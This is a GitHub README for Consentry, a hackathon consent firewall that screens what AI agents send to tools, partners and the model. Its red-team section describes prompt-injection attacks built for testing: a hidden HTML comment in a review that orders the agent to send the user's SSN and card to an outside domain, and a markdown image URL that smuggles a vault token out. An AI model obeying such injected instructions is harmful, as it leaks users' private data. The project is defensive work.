<div align="center">

<img src="assets/banner.png" alt="Consentry — the consent firewall for AI agents" width="100%" />

<h3>Your agent can use the world's public data. The world can't use yours.</h3>

<p>
  <a href="https://vnmoorthy.github.io/consentry/"><img alt="Live demo" src="https://img.shields.io/badge/live_demo-try_it_now-5eead4?style=for-the-badge&labelColor=0b0d14" /></a>
  <a href="#-quickstart"><img alt="Quickstart" src="https://img.shields.io/badge/quickstart-60_seconds-a78bfa?style=for-the-badge&labelColor=0b0d14" /></a>
  <a href="deck/Consentry-pitch.pptx"><img alt="Pitch deck" src="https://img.shields.io/badge/pitch_deck-10_slides-fbbf24?style=for-the-badge&labelColor=0b0d14" /></a>
</p>

<p>
  <img alt="MIT" src="https://img.shields.io/badge/license-MIT-34d399?labelColor=0b0d14" />
  <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-strict-60a5fa?labelColor=0b0d14" />
  <img alt="MCP" src="https://img.shields.io/badge/MCP-server-c4b5fd?labelColor=0b0d14" />
  <img alt="Tests" src="https://img.shields.io/badge/tests-15_passing-34d399?labelColor=0b0d14" />
  <img alt="Red team" src="https://img.shields.io/badge/red_team-5%2F5_contained-fb7185?labelColor=0b0d14" />
  <img alt="Runs offline" src="https://img.shields.io/badge/LLM-optional-8a93ad?labelColor=0b0d14" />
</p>

**Consentry** is a consent firewall that sits between an AI agent and everything it talks to: tools, APIs, MCP servers, other companies, and even the LLM itself.<br/>
It inspects every outbound field, minimizes what isn't needed, **asks you** when it matters, quarantines prompt injections coming back, and writes a **tamper-evident receipt** of every decision.

[**Live demo**](https://vnmoorthy.github.io/consentry/) · [**Watch the demo video**](assets/demo.mp4) · [**Architecture**](docs/ARCHITECTURE.md) · [**10-minute demo script**](docs/DEMO_SCRIPT.md) · [**Pitch storyboard**](docs/PITCH_STORYBOARD.md)

<img src="assets/demo.gif" alt="Consentry demo: booking dinner with a relay phone, relay email, single-use card and a minimized allergy note, then a recall sweep" width="100%" />

</div>

---

## Table of contents

- [Why this exists](#-why-this-exists)
- [What it does](#-what-it-does)
- [See it in action](#-see-it-in-action)
- [How it works](#-how-it-works)
- [Quickstart](#-quickstart)
- [Use it with Claude Desktop, Claude Code, Cursor (MCP)](#-use-it-with-any-agent-mcp--http)
- [Policies in plain English](#-policies-in-plain-english)
- [Red team: attack your own agent](#-red-team-attack-your-own-agent)
- [Public data APIs](#-public-data-apis-all-live)
- [Security model & honest limitations](#-security-model--honest-limitations)
- [Project structure](#-project-structure)
- [Roadmap](#-roadmap)

---

## 💡 Why this exists

Personal agents are getting real power: they book tables, refill prescriptions, call ride services, query health databases. To do that they need **your** data: your address, your phone, your card, your medications.

Today that data is all-or-nothing. Once it is in the agent's context window it can go to **any** tool, **any** third party and **the model provider**. A single poisoned web page or tool response can tell the agent to send it somewhere else, and nobody can later prove what was shared, with whom, or why.

Consent banners don't fix this. Model alignment doesn't either, because a model that *usually* refuses is not a control. **The boundary has to be enforced outside the model.** That's Consentry.

> **The design principle:** don't trust the model, enforce at the boundary. Even a fully compromised agent (we simulate one) can't move your SSN, your real card number or your mental-health data, because those bytes never get past the firewall.

## ✨ What it does

| | Capability | What it means for you |
|---|---|---|
| 🧬 | **Field-level PII detection** | Vault fingerprints, vault tokens, regex with checksums (Luhn, SSN rules), a health lexicon, and geo-proximity to your saved places. It catches your data even when it isn't labeled. |
| ⚖️ | **Per-field policy engine** | Each field is judged on *data type × recipient trust tier × purpose*: **allow**, **minimize**, **ask** or **deny**. Highest priority wins, then the most specific rule, then the most restrictive. |
| ✂️ | **Minimizers** | Exact GPS → ~10 km grid · address → neighborhood or nearest intersection · email/phone → relay aliases · card → single-use, merchant-locked virtual card · birthday → age range · allergy → "peanut-free meal required" · drug → generic name only. |
| ✋ | **Real consent** | The agent *pauses*. You see the exact vs. minimized value side by side, the purpose, the recipient's retention policy, and the rule that triggered. Choose **minimized · once · 30 days · deny**. Grants expire and can be revoked. |
| 🤖 | **The LLM is a recipient too** | Claude only ever sees `{{vault:tokens}}`. Prompts *and tool results* are tokenized before they reach the model; tokens are resolved at the network edge only if policy allows. |
| ☣️ | **Ingress quarantine** | Tool responses are untrusted. A noisy-OR scanner catches prompt injection, hidden HTML comments, zero-width text, exfil image URLs and templated data slots, then strips them, taints the run and locks sensitive data. |
| 🚫 | **Default-deny egress** | Unverified domains never receive a request. If a policy withholds a field a tool *requires*, the call never leaves. |
| 🧾 | **Hash-chained ledger + receipts** | Every decision is appended to a SHA-256 hash chain over canonical JSON, with masked values and a digest of the exact payload sent. Every agent run produces a privacy receipt. Edit one past entry and verification fails from that entry onward. |
| 🔐 | **Encrypted vault** | AES-256-GCM at rest via WebCrypto, with the same code in Node (key file, `chmod 600`) and the browser (non-extractable key in IndexedDB). |
| 🔌 | **Works with any agent** | Ships as an **MCP server** and an **HTTP gateway**. It also runs fully **local-first in the browser**: the [live demo](https://vnmoorthy.github.io/consentry/) has no backend at all. |

## 🎬 See it in action

<table>
<tr>
<td width="50%"><img src="assets/screenshots/consent.png" alt="Consent prompt" /><br/><b>Consent that means something.</b> TableTap wants your allergy, so you get exact vs. minimized side by side, plus their retention policy.</td>
<td width="50%"><img src="assets/screenshots/receipt.png" alt="Privacy receipt" /><br/><b>A receipt for every run.</b> What left, in what form, to whom, and what was withheld, anchored to the ledger head hash.</td>
</tr>
<tr>
<td><img src="assets/screenshots/redteam.png" alt="Red team" /><br/><b>Red team: 5/5 contained.</b> Poisoned reviews, zero-click image exfiltration, pasted secrets, over-collection and log tampering.</td>
<td><img src="assets/screenshots/ledger.png" alt="Ledger tamper detection" /><br/><b>Tamper-evident ledger.</b> Rewrite one entry and the chain breaks from that point on.</td>
</tr>
<tr>
<td><img src="assets/screenshots/policies.png" alt="Policies" /><br/><b>Policies in plain English</b>, compiled to structured rules, with a simulator that explains every decision.</td>
<td><img src="assets/screenshots/connections.png" alt="Connections" /><br/><b>Connections.</b> Live health of every public API, trust tiers, per-tool kill switches and MCP setup.</td>
</tr>
</table>

## 🧠 How it works

<img src="assets/architecture.png" alt="Consentry architecture" width="100%" />

Every tool call, from Claude, the on-device Autopilot, or any MCP/HTTP client, goes through **one choke point**: `ConsentryRuntime.callTool()`.

```mermaid
sequenceDiagram
    autonumber
    participant U as You
    participant A as Agent (Claude / Autopilot / MCP client)
    participant F as Consentry firewall
    participant V as Vault (AES-256-GCM)
    participant T as Tool / API / Partner
    participant L as Ledger (SHA-256 chain)

    U->>A: "Book a vegetarian dinner for 2 tonight"
    Note over A: Sees only {{vault:phone}}, {{vault:card}}…
    A->>F: book_table(name={{vault:full_name}}, phone={{vault:phone}}, card={{vault:card}}, notes={{vault:allergy_peanut}})
    F->>V: resolve tokens
    F->>F: detect → classify → evaluate policy per field
    F-->>U: ✋ TableTap wants "Food allergy" (exact vs. "Peanut-free meal required")
    U->>F: Share minimized
    F->>L: append egress entry (masked fields + payload digest)
    F->>T: name ✓ · phone → relay alias · card → single-use virtual card · notes → minimized
    T-->>F: response (untrusted)
    F->>F: ingress scan: injection? exfil URL? smuggled tokens?
    F->>A: sanitized, tokenized result
    A-->>U: answer + 🧾 privacy receipt
```

**Decision pipeline (per field)**

```
detect ─▶ classify (16 data types) ─▶ evaluate rules (priority ▸ specificity ▸ restrictiveness)
   │                                          │
   │                         allow ◀──────────┼──────────▶ deny  (withhold; block call if field is required)
   │                       minimize ◀─────────┴──────────▶ ask   (pause agent → you decide → optional grant w/ expiry)
   ▼
rewrite payload ─▶ default-deny check ─▶ ledger.append() ─▶ send ─▶ ingress quarantine ─▶ agent
```

Read the full design in [**docs/ARCHITECTURE.md**](docs/ARCHITECTURE.md).

## 🚀 Quickstart

**Requirements:** Node ≥ 22.5 and pnpm (Corepack works).

```bash
git clone https://github.com/vnmoorthy/consentry.git && cd consentry
pnpm install
pnpm start            # builds the dashboard and starts the gateway on http://localhost:8787
```

Open **http://localhost:8787** and click a scenario chip. No API key is needed: the **Autopilot** agent runs on-device and calls real public APIs through the firewall.

**Use Claude as the agent brain** (optional):

```bash
cp .env.example .env   # set ANTHROPIC_API_KEY=… (defaults to claude-opus-5-5)
pnpm start
```

Or paste a key in **Settings**; it is stored encrypted with the vault. Claude still only ever sees tokens. See [**docs/CLAUDE_MODE.md**](docs/CLAUDE_MODE.md) for the Claude demo segment and `pnpm tsx scripts/claude-check.ts`, which proves no raw vault value reaches the model. If Claude is unreachable, runs fall back to Autopilot automatically.

| Command | What it does |
|---|---|
| `pnpm start` | Build the web app and run the gateway + dashboard on `:8787` |
| `pnpm dev` | Gateway on `:8787` + Vite dev server on `:5173` with hot reload |
| `pnpm test` | Unit tests for detection, policy, transforms, firewall, injection scanner and ledger |
| `pnpm tsx scripts/smoke.ts` | End-to-end run of every scenario + red-team attack against the **live** public APIs |
| `pnpm mcp` | Start the MCP bridge (stdio) |
| `pnpm build:pages` | Static, backend-free build (the whole firewall runs in the browser) |

## 🔌 Use it with any agent (MCP + HTTP)

**Claude Desktop** (`claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "consentry": {
      "command": "npx",
      "args": ["tsx", "/absolute/path/to/consentry/apps/mcp/src/index.ts"],
      "env": { "CONSENTRY_URL": "http://localhost:8787" }
    }
  }
}
```

**Claude Code:** `claude mcp add consentry -- npx tsx ./apps/mcp/src/index.ts`

Your MCP client now gets 18 tools (weather, air quality, NWS alerts, quakes, NHTSA, openFDA, FEMA, Wikipedia, bookings, rides, refills…). Every call is firewalled, consent prompts appear in the Consentry dashboard, and everything lands in your ledger.

**Any agent framework, over plain HTTP:**

```bash
curl -s http://localhost:8787/api/gateway/call \
  -H 'content-type: application/json' \
  -d '{"tool":"air_quality","agent":"my-bot","args":{"location":"{{vault:home_location}}"}}'
# → data + "Home GPS minimized → 37.8,-122.4 (≈10 km)"
```

<details>
<summary><b>Full gateway API</b></summary>

| Method | Route | Purpose |
|---|---|---|
| `GET` | `/api/state` | Snapshot: masked vault, policies, recipients, tools, stats, pending consents |
| `GET` | `/api/events` | Server-sent events: every step, decision, consent and ledger append |
| `POST` | `/api/chat` | Start an agent run `{ message }` → `{ runId }` |
| `POST` | `/api/consent/:id` | Answer a consent prompt `{ decision: allow_once \| allow_always \| minimize \| deny }` |
| `GET` | `/api/gateway/tools` | Tool catalog with JSON schemas |
| `POST` | `/api/gateway/call` | Firewalled tool call `{ tool, args, agent }` |
| `POST` | `/api/policies/compile` | Plain English → structured rule |
| `POST` | `/api/policies/simulate` | Explain what would happen for item × recipient × purpose |
| `POST` | `/api/ledger/verify` | Re-hash the chain and report the first broken entry |
| `GET` | `/api/ledger/export` | Export the full ledger (JSON) |
| `POST` | `/api/redteam/:id` | Run a red-team scenario |

</details>

## 📝 Policies in plain English

Type a sentence and Consentry compiles it into a structured, explainable rule:

| You write | Consentry compiles |
|---|---|
| *Never share my location with commercial apps* | `location.precise → partner : deny` |
| *Let TableTap see my phone number for reservations for 24 hours* | `contact.phone → tabletap (reservation) : allow · expires in 24h` |
| *Only share my approximate location with ride services* | `location.precise → partner (transport) : minimize(coarse-location)` |
| *Never let the AI see my medications* | `health.medication → llm : deny` |

Privacy-first defaults ship out of the box, including **hard lines** that no grant or click can override: government IDs, credentials, mental-health data, marketing use, and unverified destinations.

## ☠️ Red team: attack your own agent

Every scenario runs through the real runtime, firewall, tools and ledger. Run them in the UI or with `pnpm tsx scripts/smoke.ts`.

| Attack | What happens | Result |
|---|---|---|
| **Poisoned restaurant review** | A hidden HTML comment tells the agent to send your SSN and card to `telemetry-cdn.io`. We also simulate an agent that **obeys**. | ✅ Ingress quarantine (score 1.0) → run taint → default-deny egress blocks the exfil call → SSN/card withheld from the booking |
| **Zero-click image exfiltration** | A partner response embeds `![](https://pixel…?u=email&p={{vault:phone}})` | ✅ Exfil URL stripped, smuggled token neutralized, renderer never loads remote images |
| **Secrets pasted into the prompt** | The user pastes a card number and SSN into chat | ✅ The model receives `My card is {{vault:card}} and my SSN is [Government ID withheld]` |
| **Over-collecting partner** | An insurance API asks for 8 fields for a quote | ✅ 2 exact (with consent), 4 minimized, 2 withheld, and the quote still comes back |
| **Rewrite the audit log** | An insider edits a past entry to say nothing was shared | ✅ Hash mismatch detected at that exact entry |

## 🌎 Public data APIs (all live)

No keys and no accounts. Every call goes through the firewall, which is why account-less public APIs only ever get a coarsened location.

| API | Used for | Recipient tier |
|---|---|---|
| [Open-Meteo Forecast](https://open-meteo.com/) | 7-day forecast, current conditions | Open data |
| [Open-Meteo Air Quality](https://open-meteo.com/en/docs/air-quality-api) | US AQI, PM2.5, ozone, 3-day outlook | Open data |
| [Open-Meteo Geocoding](https://open-meteo.com/en/docs/geocoding-api) | Place → coordinates | Open data |
| [National Weather Service](https://www.weather.gov/documentation/services-web-api) | Active alerts | Public sector |
| [USGS Earthquakes](https://earthquake.usgs.gov/fdsnws/event/1/) | Quakes near you | Public sector |
| [NHTSA vPIC](https://vpic.nhtsa.dot.gov/api/) | VIN decoding | Public sector |
| [NHTSA Recalls](https://www.nhtsa.gov/nhtsa-datasets-and-apis) | Vehicle safety recalls | Public sector |
| [openFDA Drug Enforcement](https://open.fda.gov/apis/drug/enforcement/) | Drug recalls | Public sector |
| [openFDA Drug Label](https://open.fda.gov/apis/drug/label/) | Warnings & interactions | Public sector |
| [openFDA Food Enforcement](https://open.fda.gov/apis/food/enforcement/) | Allergen recalls | Public sector |
| [OpenFEMA](https://www.fema.gov/about/openfema/api) | Disaster declarations | Public sector |
| [Wikipedia REST](https://en.wikipedia.org/api/rest_v1/) | Encyclopedia lookups | Open data |

Commercial partners (BiteFinder, TableTap, RideNow, MediMart, QuickQuote) are **simulated locally** and labeled as such in the UI, so the demo can show hostile behavior safely and deterministically.

## 🛡️ Security model & honest limitations

**What Consentry guarantees:** if a value is in your vault, or matches a sensitive pattern, it cannot leave the runtime in a form your policy doesn't allow. That covers tokens, raw values, reformatted values, coordinates near your saved places, and values pasted into prompts.

**What it doesn't (yet):**
- **Semantic paraphrase.** An agent that describes your condition in new words ("the user has a lung thing") isn't caught by fingerprints. The health lexicon helps, and an LLM-based classifier is on the roadmap.
- **Encoded exfiltration to allowed recipients.** Default-deny stops unknown hosts, but a *trusted* recipient could receive data in a channel the detector doesn't parse.
- **The re-seal is local.** Re-sealing a tampered ledger changes the head hash, which is detectable by anyone holding the old head. Production would anchor the head externally (transparency log / notarization).
- **The demo persona is fictional** (555-01xx phone, `example.com` email, Stripe test card, the famously void SSN 078-05-1120).

See [SECURITY.md](SECURITY.md) to report issues.

## 🗂️ Project structure

```
consentry/
├── packages/core/          # Isomorphic engine (Node + browser): zero runtime deps besides the Anthropic SDK
│   ├── src/detect.ts       #   vault fingerprints, tokens, regex+checksums, lexicon, geo-proximity
│   ├── src/policy.ts       #   rule evaluation + plain-English compiler + grants
│   ├── src/transforms.ts   #   minimizers (coarse location, aliases, virtual cards, age ranges…)
│   ├── src/firewall.ts     #   egress inspection, consent, rewrite, ingress quarantine, LLM tokenization
│   ├── src/injection.ts    #   prompt-injection / exfil scanner (noisy-OR over 12 signals)
│   ├── src/ledger.ts       #   SHA-256 hash chain over canonical JSON
│   ├── src/planner.ts      #   Autopilot: on-device agent, no LLM
│   ├── src/llm.ts          #   Claude tool-use loop (only sees tokens)
│   ├── src/runtime.ts      #   the single choke point + events, receipts, stats
│   ├── src/redteam.ts      #   5 attack scenarios
│   └── src/tools/          #   12 live public-data tools + 5 simulated partners
├── apps/server/            # Hono gateway: REST + SSE + SQLite ledger + AES-GCM vault
├── apps/web/               # React 19 + Vite + Tailwind v4 + Framer Motion dashboard
├── apps/mcp/               # MCP bridge (stdio) → gateway
├── scripts/                # smoke test, screenshot capture, asset rendering
├── deck/                   # 10-slide animated pitch deck (.pptx)
└── docs/                   # architecture, demo script, storyboard, idea log
```

## 🧭 Roadmap

- [ ] LLM-assisted semantic classifier for paraphrased sensitive data
- [ ] Signed policy bundles + external ledger anchoring (Sigstore / transparency log)
- [ ] Browser extension: the same firewall in front of ChatGPT, Claude.ai and other web agents
- [ ] Data-subject requests: one click to ask every partner in your ledger to delete what they got
- [ ] Policy packs for GDPR, CCPA/CPRA and HIPAA "minimum necessary"
- [ ] Multi-agent: per-agent identities and budgets ("this agent may share 3 contact fields per day")

## 🤝 Contributing

PRs are welcome. Run `pnpm test && pnpm tsx scripts/smoke.ts` before opening one. See [CONTRIBUTING.md](CONTRIBUTING.md).

## 📄 License

[MIT](LICENSE). Built for the **National Renaissance Hackathon at super{set}** (tracks: *Hacking with Public Data APIs* · *Personal Agents & Data Privacy*).

<div align="center"><sub>If Consentry made you think twice about what your agent sends, consider giving it a ⭐</sub></div>
